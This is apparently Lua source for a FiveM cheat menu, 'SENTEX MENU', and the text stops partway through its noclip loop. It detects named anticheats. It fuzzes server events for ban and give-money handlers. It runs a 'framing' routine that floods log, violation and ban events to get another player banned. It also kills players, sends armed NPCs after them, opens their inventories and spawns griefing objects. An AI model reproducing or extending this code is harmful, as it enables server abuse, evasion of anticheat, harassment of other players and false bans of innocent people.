--[[
    SENTEX MENU v3.6 Beta - DUI con HTML incrustado (CORREGIDO)
    Abre con F1 - Todas las funciones originales.
]]

local _r = math.random
local _w = Citizen.Wait
local _notify = function(msg)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(msg)
    DrawNotification(false, false)
end

local _version = "v3.6 Beta + EH"
local _discord = ".gg/sentexmodz"

-- ========== DETECCIÓN DE ANTICHEAT ==========
local _acDetected = false
local _acList = {}

local _acDB = {
    {"WaveShield", {"waveshield", "ws_core", "ws_anticheat"}},
    {"FiveGuard", {"fiveguard", "fg_anticheat"}},
    {"ElectronAC", {"electronac", "electron_", "eac"}},
    {"Likizao", {"likizao", "lkz", "likizao_anticheat"}},
    {"Eulen", {"eulen", "eulencheat", "eulen_anticheat"}},
    {"RedEngine", {"redengine", "red_anticheat", "reac"}},
    {"InfinityAC", {"infinityac", "infinity_", "iac"}},
    {"PhoenixAC", {"phoenixac", "phoenix_anticheat"}},
    {"VexAC", {"vexac", "vex_anticheat"}},
    {"NexusAC", {"nexusac", "nexus_anticheat"}},
    {"ReaperV4", {"reaperv4", "reaper_ac"}},
    {"Eagle", {"eagle", "ec_ac", "ec-ac"}},
    {"FiniAC", {"finiac", "fini_ac"}},
}

local function _scanAC()
    local found = {}
    local ok, num = pcall(GetNumResources)
    if ok then
        for i = 0, num - 1 do
            local res = GetResourceByFindIndex(i)
            if res then
                local name = string.lower(res)
                for _, ac in ipairs(_acDB) do
                    for _, p in ipairs(ac[2]) do
                        if name:find(p, 1, true) then
                            local startPos = name:find(p, 1, true)
                            if startPos == 1 or name:sub(startPos-1, startPos-1) == '_' then
                                found[ac[1]] = true
                            end
                        end
                    end
                end
            end
            _w(0)
        end
    end
    if next(found) then
        _acDetected = true
        _acList = {}
        for name,_ in pairs(found) do table.insert(_acList, name) end
        _notify("~r~⚠️ Anticheat detectado: ~y~"..table.concat(_acList,", ").."~s~")
        _notify("~r~ADVERTENCIA: Riesgo de sanción. Usa bajo tu responsabilidad.")
        SendNUIMessage({ type = 'updateACStatus', detected = true })
    else
        _acDetected = false
        _acList = {}
        _notify("~g~No se detectaron anticheats conocidos")
        SendNUIMessage({ type = 'updateACStatus', detected = false })
    end
end

-- ========== ACCIONES ORIGINALES ==========
local function _curar()
    local p = PlayerPedId()
    SetEntityHealth(p, GetEntityMaxHealth(p))
    SetPedArmour(p, 100)
    ClearPedBloodDamage(p)
    _notify("~g~Salud y armadura restauradas")
end

local function _revivirESX()
    TriggerEvent('esx_ambulancejob:revive')
    _notify("~g~Reviviendo (ESX)")
end

local function _revivirQB()
    local p = PlayerPedId()
    if IsPedDeadOrDying(p, true) then
        TriggerEvent('hospital:client:Revive')
        _w(100)
        if IsPedDeadOrDying(p, true) then
            TriggerServerEvent('hospital:server:RevivePlayer', GetPlayerServerId(PlayerId()))
        end
        _w(100)
        if exports['qbx_medical'] then
            pcall(function() exports['qbx_medical']:RevivePlayer() end)
        end
        _notify("~g~Intentando revivir (QB/QC)")
    else
        _notify("~r~No estás muerto")
    end
end

local function _revivirJugador(pid)
    local targetPed = GetPlayerPed(pid)
    if not targetPed or targetPed == 0 then _notify("~r~Jugador no encontrado") return end
    TriggerEvent('esx_ambulancejob:revive', pid)
    TriggerEvent('hospital:client:Revive', pid)
    TriggerServerEvent('hospital:server:RevivePlayer', GetPlayerServerId(pid))
    if exports['qbx_medical'] then pcall(function() exports['qbx_medical']:RevivePlayer(pid) end) end
    TriggerServerEvent('qb-hospital:server:RevivePlayer', GetPlayerServerId(pid))
    _w(500)
    if IsPedDeadOrDying(targetPed, true) then
        SetEntityHealth(targetPed, GetEntityMaxHealth(targetPed))
        ClearPedBloodDamage(targetPed)
        _notify("~g~Revivido por método directo")
    else
        _notify("~g~Intento de revivir completado")
    end
end

local function _repararVeh(v)
    if not v then v = GetVehiclePedIsIn(PlayerPedId(), false) end
    if v and v ~= 0 then
        SetVehicleFixed(v)
        SetVehicleDirtLevel(v, 0.0)
        _notify("~g~Vehículo reparado y limpiado")
    else
        _notify("~r~No estás en un vehículo")
    end
end

local function _flipVeh(v)
    if not v then v = GetVehiclePedIsIn(PlayerPedId(), false) end
    if v and v ~= 0 then
        local rot = GetEntityRotation(v)
        SetEntityRotation(v, rot.x, rot.y, rot.z + 180.0, 2, true)
        _notify("~g~Vehículo volteado")
    else
        _notify("~r~No estás en un vehículo")
    end
end

local function _limpiarVeh(v)
    if not v then v = GetVehiclePedIsIn(PlayerPedId(), false) end
    if v and v ~= 0 then
        SetVehicleDirtLevel(v, 0.0)
        _notify("~g~Vehículo limpiado")
    else
        _notify("~r~No estás en un vehículo")
    end
end

local function _conducirVeh(v)
    if not v or v == 0 then _notify("~r~El vehículo ya no existe") return end
    local p = PlayerPedId()
    local vCoord = GetEntityCoords(v)
    local dist = #(GetEntityCoords(p) - vCoord)
    if dist > 10.0 then
        _notify("~y~Teletransportando...")
        DoScreenFadeOut(500)
        _w(500 + _r(100,300))
        local offset = 2.0
        local newC = vector3(vCoord.x+offset, vCoord.y+offset, vCoord.z)
        SetEntityCoords(p, newC.x, newC.y, newC.z, false, false, false, false)
        _w(200)
        DoScreenFadeIn(500)
        _w(300)
    end
    local driver = GetPedInVehicleSeat(v, -1)
    if driver and driver ~= 0 then
        ClearPedTasksImmediately(driver)
        SetEntityCoords(driver, GetEntityCoords(driver)+vector3(1.0,1.0,0.5), false, false, false, false)
        _notify("~y~Conductor expulsado")
        _w(200)
    end
    TaskWarpPedIntoVehicle(p, v, -1)
    _notify("~g~Te has subido al vehículo")
end

local function _spawnVeh()
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "Modelo:", "", "", "", 30)
    while UpdateOnscreenKeyboard() == 0 do _w(0) end
    local res = GetOnscreenKeyboardResult()
    if res and res ~= "" then
        local model = res:lower()
        if IsModelValid(model) then
            RequestModel(model)
            while not HasModelLoaded(model) do _w(10) end
            local p = PlayerPedId()
            local coords = GetEntityCoords(p)
            local heading = GetEntityHeading(p)
            local veh = CreateVehicle(model, coords.x+2.0, coords.y+2.0, coords.z, heading, true, false)
            SetVehicleOnGroundProperly(veh)
            SetModelAsNoLongerNeeded(model)
            _notify("~g~Vehículo ~b~"..model.." ~g~spawneado")
        else
            _notify("~r~Modelo inválido: "..model)
        end
    end
end

local function _vehiculosCercanos()
    local list = {}
    local p = PlayerPedId()
    local pCoord = GetEntityCoords(p)
    local pool = GetGamePool("CVehicle")
    for i=1,#pool do
        local v = pool[i]
        if v ~= 0 and #(pCoord - GetEntityCoords(v)) < 150.0 then
            table.insert(list, v)
        end
    end
    return list
end

local function _nombreVeh(v)
    local model = GetEntityModel(v)
    local name = GetLabelText(GetDisplayNameFromVehicleModel(model))
    if name == "NULL" or name == "" then
        name = GetDisplayNameFromVehicleModel(model)
        if name == "NULL" or name == "" then
            name = tostring(model):upper()
        end
    end
    return name
end

-- CARGAR/LANZAR VEHÍCULO INDIVIDUAL
local _vehCargado = nil
local _cargando = false

local function _rotToDir(rot)
    local adj = vec3((math.pi/180)*rot.x, (math.pi/180)*rot.y, (math.pi/180)*rot.z)
    return vec3(-math.sin(adj.z)*math.abs(math.cos(adj.x)), math.cos(adj.z)*math.abs(math.cos(adj.x)), math.sin(adj.x))
end

local function _cargarVeh()
    local p = PlayerPedId()
    local camPos = GetGameplayCamCoord()
    local camRot = GetGameplayCamRot(2)
    local dir = _rotToDir(camRot)
    local dest = vec3(camPos.x+dir.x*10.0, camPos.y+dir.y*10.0, camPos.z+dir.z*10.0)
    local ray = StartShapeTestRay(camPos.x, camPos.y, camPos.z, dest.x, dest.y, dest.z, -1, p, 0)
    local _, hit, _, _, ent = GetShapeTestResult(ray)
    if hit==1 and GetEntityType(ent)==2 then
        if _cargando then _notify("~r~Ya estás cargando un vehículo") return end
        _vehCargado = ent
        _cargando = true
        if not NetworkHasControlOfEntity(_vehCargado) then
            NetworkRequestControlOfEntity(_vehCargado)
            local t = 0
            while not NetworkHasControlOfEntity(_vehCargado) and t < 20 do _w(50) t=t+1 end
        end
        FreezeEntityPosition(_vehCargado, true)
        AttachEntityToEntity(_vehCargado, p, GetPedBoneIndex(p,60309), 1.0,0.5,0.0,0.0,0.0,0.0, true, true, false, false, 1, true)
        RequestAnimDict('anim@mp_rollarcoaster')
        while not HasAnimDictLoaded('anim@mp_rollarcoaster') do _w(10) end
        TaskPlayAnim(p, 'anim@mp_rollarcoaster', 'hands_up_idle_a_player_one', 8.0, -8.0, -1, 50, 0, false, false, false)
        _notify("~g~Vehículo cargado")
    else
        _notify("~r~No estás mirando a ningún vehículo")
    end
end

local function _lanzarVeh()
    if not _cargando or not _vehCargado then
        _notify("~r~No tienes ningún vehículo cargado")
        return
    end
    local p = PlayerPedId()
    local camRot = GetGameplayCamRot(2)
    local dir = _rotToDir(camRot)
    DetachEntity(_vehCargado, true, true)
    FreezeEntityPosition(_vehCargado, false)
    local force = 50.0
    ApplyForceToEntity(_vehCargado, 1, dir.x*force, dir.y*force, dir.z*force, 0.0,0.0,0.0, 0, false, true, true, false, true)
    ClearPedTasks(p)
    _notify("~y~Vehículo lanzado con fuerza")
    _vehCargado = nil
    _cargando = false
end

-- JUGADORES
local function _listaJugadores()
    local list = {}
    for i=0,255 do
        if NetworkIsPlayerActive(i) then
            local ped = GetPlayerPed(i)
            if ped and ped~=0 then table.insert(list, i) end
        end
    end
    return list
end

local function _nombreJugador(pid)
    local ok, name = pcall(function() return GetPlayerName(pid) end)
    if ok and name then return name end
    return "Jugador "..pid
end

-- SPAWN NPCs CONTRA UN JUGADOR
local function _spawnNPCs(tgt, cantidad)
    cantidad = cantidad or _r(3, 6)
    local tgtPed = GetPlayerPed(tgt)
    if not tgtPed or tgtPed==0 then _notify("~r~Jugador no encontrado") return end
    local tgtCoord = GetEntityCoords(tgtPed)
    local modelos = {"a_m_y_hipster_01", "a_m_y_skater_01", "a_m_y_runner_01", "a_m_y_beach_01", "a_m_y_cyclist_01"}
    _notify("~r~Spawneando "..cantidad.." NPCs hostiles contra ".._nombreJugador(tgt))
    
    local relationshipGroup = CreateRelationshipGroup("HOSTILE_NPCS")
    local playerGroup = GetHashKey("PLAYER")
    SetRelationshipBetweenGroups(1, relationshipGroup, playerGroup)
    SetRelationshipBetweenGroups(0, relationshipGroup, relationshipGroup)
    
    for i=1, cantidad do
        local model = modelos[_r(#modelos)]
        RequestModel(model)
        while not HasModelLoaded(model) do _w(10) end
        local angle = math.rad(_r(0,360))
        local dist = _r(5, 15)
        local x = tgtCoord.x + math.cos(angle) * dist
        local y = tgtCoord.y + math.sin(angle) * dist
        local z = tgtCoord.z
        local npc = CreatePed(0, model, x, y, z, _r(0,360), true, true)
        SetPedRelationshipGroupHash(npc, relationshipGroup)
        SetPedCombatAttributes(npc, 0, true)
        SetPedCombatAbility(npc, 100)
        SetPedAccuracy(npc, 70)
        SetPedArmour(npc, 50)
        SetPedCanRagdoll(npc, true)
        GiveWeaponToPed(npc, GetHashKey("WEAPON_PISTOL"), 999, true, true)
        SetPedInfiniteAmmo(npc, true)
        TaskGoToEntity(npc, tgtPed, -1, 2.0, 5.0, 1073741824, 0)
        _w(500)
        TaskCombatPed(npc, tgtPed, 0, 16)
        SetEntityAsMissionEntity(npc, true, true)
        SetModelAsNoLongerNeeded(model)
        _w(_r(200, 500))
    end
    _notify("~r~"..cantidad.." NPCs hostiles atacando a ".._nombreJugador(tgt))
end

-- INVENTARIO
local function _abrirInventario(tgt)
    local sid = GetPlayerServerId(tgt)
    if not sid then _notify("~r~No se pudo obtener Server ID") return end
    TriggerEvent('ox_inventory:openInventory', 'otherplayer', sid)
    TriggerServerEvent('esx_inventory:openInventory', 'otherplayer', sid)
    TriggerServerEvent('qb-inventory:server:OpenInventory', 'player', sid)
    TriggerEvent('inventory:client:openInventory', tgt)
    _notify("~g~Intentando abrir inventario del jugador")
end

local function _matarJugador(tgt)
    local tgtPed = GetPlayerPed(tgt)
    if tgtPed and tgtPed~=0 then
        SetEntityHealth(tgtPed, 0)
        _notify("~r~Jugador eliminado")
    end
end

local function _teleportTo(tgt)
    local tgtPed = GetPlayerPed(tgt)
    if tgtPed and tgtPed~=0 then
        local coord = GetEntityCoords(tgtPed)
        local p = PlayerPedId()
        DoScreenFadeOut(500)
        _w(500)
        SetEntityCoords(p, coord.x, coord.y, coord.z+0.5, false, false, false, false)
        _w(100)
        DoScreenFadeIn(500)
        _notify("~g~Teletransportado")
    end
end

local function _engancharVehCercano(tgt)
    local tgtPed = GetPlayerPed(tgt)
    if not tgtPed or tgtPed == 0 then _notify("~r~Jugador no encontrado") return end
    local pos = GetEntityCoords(tgtPed)
    local pool = GetGamePool("CVehicle")
    local closestVeh = nil
    local closestDist = 30.0
    for _, v in ipairs(pool) do
        local vPos = GetEntityCoords(v)
        local dist = #(pos - vPos)
        if dist < closestDist and v ~= GetVehiclePedIsIn(tgtPed, false) then
            closestDist = dist
            closestVeh = v
        end
    end
    if closestVeh then
        if not NetworkHasControlOfEntity(closestVeh) then
            NetworkRequestControlOfEntity(closestVeh)
            local t=0
            while not NetworkHasControlOfEntity(closestVeh) and t<20 do _w(50) t=t+1 end
        end
        AttachEntityToEntity(closestVeh, tgtPed, GetPedBoneIndex(tgtPed, 60309), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, false, false, 2, true)
        _notify("~g~Vehículo enganchado al jugador")
    else
        _notify("~r~No hay vehículos cerca del jugador")
    end
end

local _siguienteJugador = nil

-- ========== EVENT HUNTER Y FRAMING ==========
local _fuzzingActive = false
local _foundEvents = {}
local _eventsToFuzz = {
    "ban", "banplayer", "kick", "admin:ban", "staff:ban", "esx:ban", "qb-ban:player",
    "FiveGuard:Ban", "anticheat:ban", "giveMoney", "addMoney", "giveItem", "revive",
    "teleport", "spawnVehicle"
}

local function _startFuzzing()
    if _fuzzingActive then _notify("~r~Ya hay escaneo") return end
    _fuzzingActive = true
    _foundEvents = {}
    _notify("~y~[Event Hunter] Fuzzing... 30s")
    local total = 0
    for _, ev in ipairs(_eventsToFuzz) do
        for _, suffix in ipairs({"", "Player", "Command", "admin:", "staff:"}) do
            local fullEv = suffix .. ev
            total = total + 1
            pcall(function() TriggerServerEvent(fullEv, "test_".._r(1,999)) end)
            _w(50)
        end
        _notify("~b~Probado: "..ev)
    end
    _fuzzingActive = false
    _notify("~g~Fuzzing completado. Revisa la consola del servidor.")
end

local function _framingAttack(pid)
    local targetId = GetPlayerServerId(pid)
    if not targetId then _notify("~r~Error ID") return end
    local targetName = _nombreJugador(pid)

    _notify("~y~[Framing] Atacando a "..targetName)

    local logs = {"qb-log:server:CreateLog", "esx_logs:addLog", "anticheat:addViolation", "FiveGuard:SendLog"}
    for _, ev in ipairs(logs) do
        for _=1,3 do
            pcall(function() TriggerServerEvent(ev, "Suspicious activity from "..targetName, "HIGH", "CHEAT") end)
            _w(50)
        end
    end

    local violations = {"FiveGuard:AddViolation", "anticheat:report", "anticheat:godmode", "anticheat:teleport_hack"}
    for i=1, 100 do
        local ev = violations[_r(#violations)]
        pcall(function() TriggerServerEvent(ev, targetId, "EXPLOIT", 100) end)
        _w(_r(5,20))
    end

    local bans = {"admin:ban", "staff:ban", "esx:ban", "qb-ban:player", "FiveGuard:Ban"}
    for _, ev in ipairs(bans) do
        pcall(function() TriggerServerEvent(ev, targetId, "Cheating detected") end)
        _w(30)
    end

    _notify("~r~Ataque completado. Si FiveGuard es vulnerable, el jugador será baneado.")
end

-- ========== ACCIONES DE JUGADOR ==========
local function _crearAccion(pid, tipo)
    return function()
        if tipo=="inventory" then _abrirInventario(pid)
        elseif tipo=="revive" then _revivirJugador(pid)
        elseif tipo=="kill" then _matarJugador(pid)
        elseif tipo=="follow" then
            if _siguienteJugador == pid then
                _siguienteJugador = nil
                SetPlayerFollowing(PlayerId(), 0)
                _notify("~y~Dejaste de seguir")
            else
                _siguienteJugador = pid
                _notify("~y~Siguiendo jugador")
            end
        elseif tipo=="teleport" then _teleportTo(pid)
        elseif tipo=="spawnnpc" then _spawnNPCs(pid, _r(3,6))
        elseif tipo=="attachveh" then _engancharVehCercano(pid)
        elseif tipo=="ban" then
            local sid = GetPlayerServerId(pid)
            if sid then
                TriggerServerEvent('admin:ban', sid, "test")
                TriggerServerEvent('staff:banPlayer', sid, "test")
                _notify("~y~Intento de baneo directo")
            end
        elseif tipo=="framing" then _framingAttack(pid)
        end
    end
end

-- ========== ENGANCHAR TODOS LOS VEHÍCULOS ==========
local _vehiclesAttached = {}

local function _attachAllNearbyVehicles()
    local ped = PlayerPedId()
    local myVeh = GetVehiclePedIsIn(ped, false)
    if myVeh == 0 then _notify("~r~Debes estar en un vehículo") return end
    local coords = GetEntityCoords(myVeh)
    local pool = GetGamePool("CVehicle")
    local count = 0
    for _, v in ipairs(pool) do
        if v ~= myVeh and not _vehiclesAttached[v] then
            if #(coords - GetEntityCoords(v)) < 100.0 then
                if not NetworkHasControlOfEntity(v) then
                    NetworkRequestControlOfEntity(v)
                    local t=0
                    while not NetworkHasControlOfEntity(v) and t<20 do _w(50) t=t+1 end
                end
                AttachEntityToEntity(v, myVeh, 0, 0.0, -2.0, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                table.insert(_vehiclesAttached, v)
                count = count + 1
            end
        end
    end
    if count > 0 then _notify("~g~Enganchados "..count.." vehículos") else _notify("~r~No hay vehículos cercanos") end
end

local function _detachAllVehicles()
    for _, v in ipairs(_vehiclesAttached) do
        if DoesEntityExist(v) then DetachEntity(v, true, false) end
    end
    _vehiclesAttached = {}
    _notify("~r~Todos los vehículos desenganchados")
end

-- ========== PROPS GIGANTES ==========
local _spawnedGiantProps = {}

local function _spawnPropGlobal(model, x, y, z, freeze)
    local prop = nil
    prop = CreateObject(GetHashKey(model), x, y, z, true, true, false)
    if not prop or prop == 0 then
        prop = CreateObjectNoOffset(GetHashKey(model), x, y, z, true, true, false)
    end
    if prop and prop ~= 0 then
        NetworkRegisterEntityAsNetworked(prop)
        local netId = NetworkGetNetworkIdFromEntity(prop)
        SetNetworkIdExistsOnAllMachines(netId, true)
        SetNetworkIdCanMigrate(netId, true)
        SetEntityAsMissionEntity(prop, true, true)
        SetEntityLoadCollisionFlag(prop, true)
        if freeze then
            FreezeEntityPosition(prop, true)
        end
        if _acDetected then
            Citizen.CreateThread(function()
                _w(100)
                SetEntityHeading(prop, _r(0,360))
                SetEntityAlpha(prop, 255, false)
            end)
        end
        table.insert(_spawnedGiantProps, prop)
        return true
    end
    return false
end

local function _spawnStuntBlock()
    local ped = PlayerPedId()
    local pos = GetEntityCoords(ped)
    local handle = StartShapeTestRay(pos.x, pos.y, pos.z+100.0, pos.x, pos.y, pos.z-100.0, -1, ped, 0)
    local _, hit, hitPos = GetShapeTestResult(handle)
    local groundZ = hit and hitPos.z or pos.z
    local spawnZ = groundZ + 1.0
    local model = "stt_prop_stunt_bblock_huge_04"
    RequestModel(model)
    local timeout = 0
    while not HasModelLoaded(model) and timeout < 100 do _w(10) timeout=timeout+1 end
    if HasModelLoaded(model) then
        if _spawnPropGlobal(model, pos.x, pos.y, spawnZ, true) then
            _notify("~g~Bloque stunt gigante spawneado (visible globalmente)")
        else
            _notify("~r~Error al spawnear bloque stunt")
        end
    else
        _notify("~r~No se pudo cargar el modelo")
    end
    SetModelAsNoLongerNeeded(model)
end

local function _spawnStuntBlockAlt()
    local ped = PlayerPedId()
    local pos = GetEntityCoords(ped)
    local handle = StartShapeTestRay(pos.x, pos.y, pos.z+100.0, pos.x, pos.y, pos.z-100.0, -1, ped, 0)
    local _, hit, hitPos = GetShapeTestResult(handle)
    local groundZ = hit and hitPos.z or pos.z
    local spawnZ = groundZ + 1.0
    local model = "stt_prop_stunt_bblock_lrg_03"
    RequestModel(model)
    local timeout = 0
    while not HasModelLoaded(model) and timeout < 100 do _w(10) timeout=timeout+1 end
    if HasModelLoaded(model) then
        if _spawnPropGlobal(model, pos.x, pos.y, spawnZ, true) then
            _notify("~g~Bloque stunt alternativo spawneado (visible globalmente)")
        else
            _notify("~r~Error al spawnear bloque stunt alternativo")
        end
    else
        _notify("~r~No se pudo cargar el modelo")
    end
    SetModelAsNoLongerNeeded(model)
end

-- ========== BOSQUE ==========
local treeModels = {
    "prop_tree_olive_01", "prop_rio_del_01", "prop_tree_birch_04",
    "prop_tree_cedar_02", "prop_tree_lficus_02", "prop_tree_cedar_s_04",
    "prop_rus_olive", "prop_tree_birch_02"
}
local _spawnedTrees = {}

local function _createForest()
    local ped = PlayerPedId()
    local center = GetEntityCoords(ped)
    local radius = 100
    local count = 300
    _notify("~y~Creando selva... (~w~"..count.." árboles~y~)")
    local created = 0
    for i = 1, count do
        local angle = math.rad(_r(0, 360))
        local dist = _r(0, radius)
        local x = center.x + math.cos(angle) * dist
        local y = center.y + math.sin(angle) * dist
        local groundHandle = StartShapeTestRay(x, y, center.z+100.0, x, y, center.z-100.0, -1, ped, 0)
        local _, hit, hitPos = GetShapeTestResult(groundHandle)
        if hit then
            local modelName = treeModels[_r(#treeModels)]
            RequestModel(modelName)
            local timeout = 0
            while not HasModelLoaded(modelName) and timeout < 50 do _w(10) timeout=timeout+1 end
            if HasModelLoaded(modelName) then
                local tree = CreateObject(GetHashKey(modelName), x, y, hitPos.z, true, true, false)
                if tree and tree~=0 then
                    FreezeEntityPosition(tree, true)
                    NetworkRegisterEntityAsNetworked(tree)
                    SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(tree), true)
                    SetEntityAsMissionEntity(tree, true, true)
                    table.insert(_spawnedTrees, tree)
                    created = created + 1
                end
                SetModelAsNoLongerNeeded(modelName)
            end
        end
        if i % 50 == 0 then _w(0) end
    end
    _notify("~g~Selva creada con "..created.." árboles (visibles para todos)")
end

-- ========== LLUVIA DE SILLAS ==========
local _rainOfChairs = false
local _chairObjects = {}

local function _startChairRain()
    if _rainOfChairs then _notify("~r~Ya está lloviendo sillas") return end
    _rainOfChairs = true
    _notify("~y~¡Lluvia de sillas activada! (30 segundos)")
    Citizen.CreateThread(function()
        local endTime = GetGameTimer() + 30000
        local chairModel = "prop_chair_01a"
        RequestModel(chairModel)
        while not HasModelLoaded(chairModel) do _w(10) end
        while GetGameTimer() < endTime and _rainOfChairs do
            local pos = GetEntityCoords(PlayerPedId())
            for i=1,10 do
                local angle = math.rad(_r(0,360))
                local rad = _r(15, 60)
                local x = pos.x + math.cos(angle)*rad
                local y = pos.y + math.sin(angle)*rad
                local z = pos.z + _r(30, 80)
                local chair = CreateObject(chairModel, x, y, z, true, true, false)
                if chair~=0 then
                    NetworkRegisterEntityAsNetworked(chair)
                    SetEntityAsMissionEntity(chair, true, true)
                    SetEntityHasGravity(chair, true)
                    SetEntityVelocity(chair, _r(-8,8), _r(-8,8), _r(-30,-10))
                    SetEntityCollision(chair, true, true)
                    table.insert(_chairObjects, chair)
                end
                _w(20)
            end
            _w(800)
        end
        SetModelAsNoLongerNeeded(chairModel)
        for _, c in ipairs(_chairObjects) do if DoesEntityExist(c) then DeleteEntity(c) end end
        _chairObjects = {}
        _rainOfChairs = false
        _notify("~r~Lluvia de sillas terminada")
    end)
end

-- SPAWN MASIVO SEGURO
local function _safeMassVehicleSpawn()
    local ped = PlayerPedId()
    local pos = GetEntityCoords(ped)
    local models = {"adder","zentorno","t20","osiris","turismor","nero","reaper","x80"}
    _notify("~y~Generando 5 vehículos alrededor...")
    for i=1,5 do
        local model = GetHashKey(models[_r(#models)])
        RequestModel(model)
        while not HasModelLoaded(model) do _w(10) end
        local angle = math.rad(_r(0,360))
        local rad = _r(10,25)
        local x = pos.x + math.cos(angle)*rad
        local y = pos.y + math.sin(angle)*rad
        local groundHandle = StartShapeTestRay(x, y, pos.z+100.0, x, y, pos.z-100.0, -1, ped, 0)
        local _, hit, hitPos = GetShapeTestResult(groundHandle)
        local z = hit and hitPos.z or pos.z
        local veh = CreateVehicle(model, x, y, z+0.5, _r(0,360), true, false)
        if veh~=0 then
            NetworkRegisterEntityAsNetworked(veh)
            SetEntityAsMissionEntity(veh, true, true)
            SetVehicleOnGroundProperly(veh)
            SetVehicleEngineOn(veh, true, true, false)
        end
        SetModelAsNoLongerNeeded(model)
        _w(250)
    end
    _notify("~g~5 vehículos spawneados (modo seguro)")
end

-- HUMO GLOBAL
local function _globalSmoke()
    local players = _listaJugadores()
    _notify("~y~Generando humo en todos los jugadores...")
    for _, pid in ipairs(players) do
        local ped = GetPlayerPed(pid)
        if ped and ped~=0 then
            local coords = GetEntityCoords(ped)
            AddExplosion(coords.x, coords.y, coords.z+1.0, 35, 1.0, true, false, 0.0, false)
        end
    end
    _notify("~g~Humo generado")
end

-- TODOS A BAILAR
local function _everyoneDance()
    local players = _listaJugadores()
    _notify("~y~¡Todos a bailar!")
    local dict = "anim@amb@nightclub@dancers@crowddance_fwd"
    local anim = "fwd_dance_loop"
    local success = false
    RequestAnimDict(dict)
    local timeout = 0
    while not HasAnimDictLoaded(dict) and timeout < 100 do
        _w(10)
        timeout = timeout + 1
    end
    if HasAnimDictLoaded(dict) then
        for _, pid in ipairs(players) do
            local ped = GetPlayerPed(pid)
            if ped and ped~=0 then
                ClearPedTasks(ped)
                TaskPlayAnim(ped, dict, anim, 8.0, -8.0, -1, 1, 0, false, false, false)
            end
        end
        success = true
    else
        dict = "anim@mp_player_intcelebrationfemale@the_woogie"
        anim = "the_woogie"
        RequestAnimDict(dict)
        timeout = 0
        while not HasAnimDictLoaded(dict) and timeout < 100 do _w(10) timeout=timeout+1 end
        if HasAnimDictLoaded(dict) then
            for _, pid in ipairs(players) do
                local ped = GetPlayerPed(pid)
                if ped and ped~=0 then
                    ClearPedTasks(ped)
                    TaskPlayAnim(ped, dict, anim, 8.0, -8.0, -1, 1, 0, false, false, false)
                end
            end
            success = true
        end
    end
    if success then
        _notify("~g~Todos están bailando")
    else
        _notify("~r~No se pudo cargar la animación, intenta de nuevo")
    end
    SetModelAsNoLongerNeeded(dict)
end

-- ========== RAMPA PERSISTENTE ==========
local RampData = {
    object = nil,
    position = nil,
    active = false
}

local function _spawnRampa()
    if RampData.active then
        _notify("~y~Ya hay una rampa activa (no se puede borrar, jódete)")
        return
    end
    
    local playerPed = PlayerPedId()
    local coords = GetEntityCoords(playerPed)
    local heading = GetEntityHeading(playerPed)
    
    local model = "prop_ramp_01"
    RequestModel(model)
    local timeout = 0
    while not HasModelLoaded(model) and timeout < 1000 do
        _w(10)
        timeout = timeout + 10
    end
    if not HasModelLoaded(model) then
        _notify("~r~Error: No se pudo cargar el modelo de la rampa")
        return
    end
    
    local forward = GetEntityForwardVector(playerPed)
    local spawnPos = vector3(coords.x + forward.x * 3.0, coords.y + forward.y * 3.0, coords.z - 0.5)
    local ramp = CreateObject(GetHashKey(model), spawnPos.x, spawnPos.y, spawnPos.z, true, true, false)
    SetEntityHeading(ramp, heading)
    SetEntityAsMissionEntity(ramp, true, true)
    FreezeEntityPosition(ramp, false)
    
    RampData.object = ramp
    RampData.position = spawnPos
    RampData.active = true
    
    _notify("~g~Rampa generada (persistente, no se puede eliminar)")
end

-- Hilo de persistencia para la rampa
Citizen.CreateThread(function()
    while true do
        _w(2000)
        if RampData.active then
            if not DoesEntityExist(RampData.object) or RampData.object == nil then
                local model = "prop_ramp_01"
                RequestModel(model)
                local timeout = 0
                while not HasModelLoaded(model) and timeout < 1000 do
                    _w(10)
                    timeout = timeout + 10
                end
                if HasModelLoaded(model) and RampData.position then
                    local newRamp = CreateObject(GetHashKey(model), RampData.position.x, RampData.position.y, RampData.position.z, true, true, false)
                    SetEntityAsMissionEntity(newRamp, true, true)
                    RampData.object = newRamp
                    _notify("~b~Rampa recuperada automáticamente (no puedes quitarla)")
                end
            end
        end
    end
end)

-- ========== NOCLIP ==========
local _noclipActivo = false
local _noclipVel = 5.0
local _boostMult = 3.0

local function _camVectors()
    local rot = GetGameplayCamRot(2)
    local pitch = math.rad(rot.x)
    local yaw = math.rad(rot.z)
    local cosP, sinP = math.cos(pitch), math.sin(pitch)
    local cosY, sinY = math.cos(yaw), math.sin(yaw)
    return vector3(-sinY*cosP, cosY*cosP, sinP), vector3(-cosY, -sinY, 0), vector3(0,0,1)
end

local function _fixPlayerPosition()
    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)
    local rayHandle = StartShapeTestRay(coords.x, coords.y, coords.z+5.0, coords.x, coords.y, coords.z-10.0, -1, ped, 0)
    local _, hit, hitPos, _, _ = GetShapeTestResult(rayHandle)
    if hit then
        local newZ = hitPos.z + 0.5
        SetEntityCoords(ped, coords.x, coords.y, newZ, false, false, false, false)
    end
end

local function _disableNoclip()
    if not _noclipActivo then return end
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, false)
    local ent = (veh~=0 and veh) or ped
    SetEntityCollision(ent, true, true)
    SetEntityInvincible(ped, false)
    FreezeEntityPosition(ent, false)
    _fixPlayerPosition()
    _noclipActivo = false
    _notify("~r~Noclip DESACTIVADO (posición corregida)")
end

Citizen.CreateThread(function()
    while true do
        if _noclipActivo and not freecamActive then
            local p = PlayerPedId()
            local ent = (GetVehiclePedIsIn(p,false)~=0 and GetVehiclePedIsIn(p,false)) or p
            SetEntityCollision(ent, false, false)
            SetEntityInvincible(p, true)
            FreezeEntityPosition(ent, false)
            SetEntityVelocity(ent, 0,0,0)
            local mx,my,mz = 0,0,0
            if IsControlPressed(0, 32) then my=my+1 end
            if IsControlPressed(0, 33) then my=my-1 end
            if IsControlPressed(0, 34) then mx=mx+1 end
            if IsControlPressed(0, 35) then mx=mx-1 end
            if IsControlPressed(0, 22) then mz=mz+1 end
            if IsControlPressed(0, 36) then mz=mz-1 end
            local speed = _noclipVel
            if IsControlPressed(0, 21) then speed = speed * _boostMult end
